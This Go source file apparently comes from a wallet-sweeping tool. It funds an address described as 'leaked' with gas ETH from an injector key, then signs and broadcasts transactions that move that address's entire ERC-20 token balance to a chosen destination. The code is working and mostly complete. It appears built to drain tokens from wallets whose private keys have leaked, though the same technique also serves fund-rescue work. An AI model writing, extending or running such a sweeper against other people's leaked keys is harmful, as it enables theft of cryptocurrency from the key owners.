package main

import (
	"context"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"strings"
	"time"

	secp "github.com/decred/dcrd/dcrec/secp256k1/v4"
)

const erc20GasLimit = uint64(65000)

func SweepERC20(ctx context.Context, privHex, tokenAddr, destAddr, nodeURL string) (string, error) {
	if nodeURL == "" {
		nodeURL = "https://cloudflare-eth.com"
	}
	privBytes, err := hexToPrivBytes(privHex)
	if err != nil {
		return "", fmt.Errorf("parse key: %w", err)
	}
	privKey := secp.PrivKeyFromBytes(privBytes)
	pubKey := privKey.PubKey()
	from := "0x" + keccakAddress(pubKey.SerializeUncompressed()[1:])

	balHex, err := erc20Call(ctx, tokenAddr, erc20BalanceCallData(from), nodeURL)
	if err != nil {
		return "", fmt.Errorf("balance check: %w", err)
	}
	bal := new(big.Int).SetBytes(hexTrim(balHex))
	if bal.Sign() == 0 {
		return "", fmt.Errorf("zero balance")
	}

	nonce, err := ethGetNoncePending(ctx, from, nodeURL)
	if err != nil {
		return "", fmt.Errorf("get nonce: %w", err)
	}
	gasPrice, err := ethGasPrice(ctx, nodeURL)
	if err != nil {
		return "", fmt.Errorf("gas price: %w", err)
	}

	transferData := erc20TransferData(destAddr, bal)
	const chainID = int64(1)
	rawTx, err := buildAndSignEthTx(privKey, nonce, gasPrice, erc20GasLimit, tokenAddr, big.NewInt(0), transferData, chainID)
	if err != nil {
		return "", fmt.Errorf("sign tx: %w", err)
	}

	txHash, err := ethSendRaw(ctx, rawTx, nodeURL)
	if err != nil {
		return "", fmt.Errorf("broadcast: %w", err)
	}
	return txHash, nil
}

func ethGetNoncePending(ctx context.Context, address, nodeURL string) (uint64, error) {
	result, err := ethRPC(ctx, nodeURL, "eth_getTransactionCount", []interface{}{address, "pending"})
	if err != nil {
		return 0, err
	}
	var hexNonce string
	if err := json.Unmarshal(result, &hexNonce); err != nil {
		return 0, err
	}
	n, ok := new(big.Int).SetString(strings.TrimPrefix(hexNonce, "0x"), 16)
	if !ok {
		return 0, fmt.Errorf("bad nonce: %s", hexNonce)
	}
	return n.Uint64(), nil
}

func erc20Call(ctx context.Context, toAddr, data, nodeURL string) ([]byte, error) {
	payload := fmt.Sprintf(
		`{"jsonrpc":"2.0","method":"eth_call","params":[{"to":"%s","data":"%s"},"latest"],"id":1}`,
		toAddr, data,
	)
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, nodeURL, strings.NewReader(payload))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{Timeout: 20 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))

	var rpcResp struct {
		Result string `json:"result"`
		Error  *struct{ Message string } `json:"error"`
	}
	if err := json.Unmarshal(body, &rpcResp); err != nil {
		return nil, fmt.Errorf("decode: %w; body: %s", err, body)
	}
	if rpcResp.Error != nil {
		return nil, fmt.Errorf("eth_call: %s", rpcResp.Error.Message)
	}
	hexStr := strings.TrimPrefix(rpcResp.Result, "0x")
	return hex.DecodeString(hexStr)
}

func erc20TransferData(toAddr string, amount *big.Int) []byte {
	to := strings.TrimPrefix(toAddr, "0x")
	am := fmt.Sprintf("%064x", amount)
	dataHex := "a9059cbb" + leftPad64(to) + am
	b, _ := hex.DecodeString(dataHex)
	return b
}

func hexTrim(raw []byte) []byte {
	i := 0
	for i < len(raw) && raw[i] == 0 {
		i++
	}
	if i == len(raw) {
		return []byte{0}
	}
	return raw[i:]
}

func InjectGas(ctx context.Context, cfg *Config, leakedAddr string, numTokens int) error {
	privBytes, err := hexToPrivBytes(cfg.InjectorKey)
	if err != nil {
		return fmt.Errorf("parse injector key: %w", err)
	}
	privKey := secp.PrivKeyFromBytes(privBytes)
	pubKey := privKey.PubKey()
	injectorAddr := "0x" + keccakAddress(pubKey.SerializeUncompressed()[1:])

	nodeURL := cfg.ETHNodeURL
	if nodeURL == "" {
		nodeURL = "https://cloudflare-eth.com"
	}

	gasPrice, err := ethGasPrice(ctx, nodeURL)
	if err != nil {
		return fmt.Errorf("gas price: %w", err)
	}

	gasETH := new(big.Int).Mul(gasPrice, big.NewInt(21000))
	gasToken := new(big.Int).Mul(gasPrice, big.NewInt(int64(numTokens)*int64(erc20GasLimit)))
	totalGas := new(big.Int).Add(gasETH, gasToken)
	buffer := new(big.Int).Mul(totalGas, big.NewInt(15))
	amount := new(big.Int).Add(totalGas, new(big.Int).Div(buffer, big.NewInt(10)))

	injectorBal, err := ethGetBalanceRaw(ctx, injectorAddr, nodeURL)
	if err != nil {
		return fmt.Errorf("injector balance: %w", err)
	}
	gasCost := new(big.Int).Mul(gasPrice, big.NewInt(21000))
	available := new(big.Int).Sub(injectorBal, gasCost)
	if available.Sign() <= 0 {
		return fmt.Errorf("injector has insufficient ETH for gas")
	}
	if amount.Cmp(available) > 0 {
		amount = available
	}

	nonce, err := ethGetNoncePending(ctx, injectorAddr, nodeURL)
	if err != nil {
		return fmt.Errorf("injector nonce: %w", err)
	}

	const chainID = int64(1)
	rawTx, err := buildAndSignEthTx(privKey, nonce, gasPrice, 21000, leakedAddr, amount, nil, chainID)
	if err != nil {
		return fmt.Errorf("sign injection tx: %w", err)
	}

	txHash, err := ethSendRaw(ctx, rawTx, nodeURL)
	if err != nil {
		return fmt.Errorf("broadcast injection: %w", err)
	}
	logger.Printf("[inject] sent %s ETH from injector to %s (tx: %s)", formatETH(amount), leakedAddr, txHash)

	for i := 0; i < 30; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(2 * time.Second):
		}
		receipt, err := ethGetTxReceipt(ctx, txHash, nodeURL)
		if err == nil && receipt != "" {
			logger.Printf("[inject] confirmed in tx %s", txHash)
			return nil
		}
	}
	logger.Printf("[inject] tx %s broadcast but not yet confirmed — proceeding anyway", txHash)
	return nil
}

func ethGetTxReceipt(ctx context.Context, txHash, nodeURL string) (string, error) {
	result, err := ethRPC(ctx, nodeURL, "eth_getTransactionReceipt", []interface{}{txHash})
	if err != nil {
		return "", err
	}
	if string(result) == "null" || string(result) == "" {
		return "", fmt.Errorf("not found")
	}
	return txHash, nil
}

func formatETH(wei *big.Int) string {
	v := new(big.Float).Quo(new(big.Float).SetInt(wei), new(big.Float).SetFloat64(1e18))
	s, _ := v.Float64()
	return fmt.Sprintf("%.8f", s)
}
